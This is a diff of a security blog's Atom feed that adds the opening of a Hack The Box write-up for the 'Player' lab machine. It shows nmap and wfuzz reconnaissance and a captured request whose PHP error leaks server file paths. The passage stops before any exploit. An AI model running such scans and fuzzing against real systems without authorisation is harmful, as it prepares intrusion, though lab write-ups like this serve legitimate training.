@@ -1,4 +1,639 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2020-01-11T16:54:26+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Bitlab</title><link href="https://0xrick.github.io/hack-the-box/bitlab/" rel="alternate" type="text/html" title="Hack The Box - Bitlab" /><published>2020-01-11T00:00:00+02:00</published><updated>2020-01-11T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bitlab</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bitlab/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://0xrick.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://0xrick.github.io/" rel="alternate" type="text/html" /><updated>2020-01-18T16:54:56+02:00</updated><id>https://0xrick.github.io/feed.xml</id><title type="html">0xRick</title><subtitle>Infosec / Cybersec Blog, Write-ups / Walkthroughs for Hack The Box retired machines and other CTF challenges, Articles about cybersecurity / hacking topics that interest me.</subtitle><entry><title type="html">Hack The Box - Player</title><link href="https://0xrick.github.io/hack-the-box/player/" rel="alternate" type="text/html" title="Hack The Box - Player" /><published>2020-01-18T00:00:00+02:00</published><updated>2020-01-18T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/player</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/player/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;Hey guys, today Player retired and here’s my write-up about it. It was a relatively hard CTF-style machine with a lot of enumeration and a couple of interesting exploits. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.145&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;player.htb&lt;/code&gt;. Let’s jump right in !
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/0.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# nmap -sV -sT -sC -o nmapinitial player.htb 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 16:29 EST
+Nmap scan report for player.htb (10.10.10.145)
+Host is up (0.35s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 d7:30:db:b9:a0:4c:79:94:78:38:b3:43:a2:50:55:81 (DSA)
+|   2048 37:2b:e4:31:ee:a6:49:0d:9f:e7:e6:01:e6:3e:0a:66 (RSA)
+|   256 0c:6c:05:ed:ad:f1:75:e8:02:e4:d2:27:3e:3a:19:8f (ECDSA)
+|_  256 11:b8:db:f3:cc:29:08:4a:49:ce:bf:91:73:40:a2:80 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 403 Forbidden
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds
+root@kali:~/Desktop/HTB/boxes/player# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22.
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;I got a 403 response when I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://player.htb/&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;subdomains-top1mil-5000.txt&lt;/code&gt;&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;seclists&lt;/code&gt;&lt;/a&gt; to enumerate virtual hosts and got these results:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/player# wfuzz --hc 403 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.player.htb&quot; http://10.10.10.145
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+Target: http://10.10.10.145/
+Total requests: 4997
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+000000019:   200        86 L     229 W    5243 Ch     &quot;dev&quot;
+000000067:   200        63 L     180 W    1470 Ch     &quot;staging&quot;
+000000070:   200        259 L    714 W    9513 Ch     &quot;chat&quot;
+
+Total time: 129.1540
+Processed Requests: 4997
+Filtered Requests: 4994
+Requests/sec.: 38.69021
+
+root@kali:~/Desktop/HTB/boxes/player# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;I added them to my hosts file and started checking each one of them.
+&lt;br /&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;dev&lt;/code&gt; there was an application that needed credentials so we’ll skip that one until we find some credentials:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;staging&lt;/code&gt; was kinda empty but there was an interesting contact form:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/4.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/5.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;The form was interesting because when I attempted to submit it I got a weird error for a second then I got redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/501.php&lt;/code&gt;:&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/6.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/player/7.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;I intercepted the request with burp to read the error.
+&lt;br /&gt;Request:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/contact.php?firstname=test&amp;amp;subject=test&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;staging.player.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://staging.player.htb/contact.html&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;Response:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OK&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Fri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2020&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;GMT&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Powered&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;By&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ubuntu4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;refresh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;501.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Encoding&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;818&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/staging/contact.php&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;function&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;args&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Cleveland&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/staging/contact.php&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;function&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;args&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Glenn&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/staging/contact.php&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;line&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;function&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;args&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Peter&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Database&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;failed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;br&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Unknown&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;variable&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service_config&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fatal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;staging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
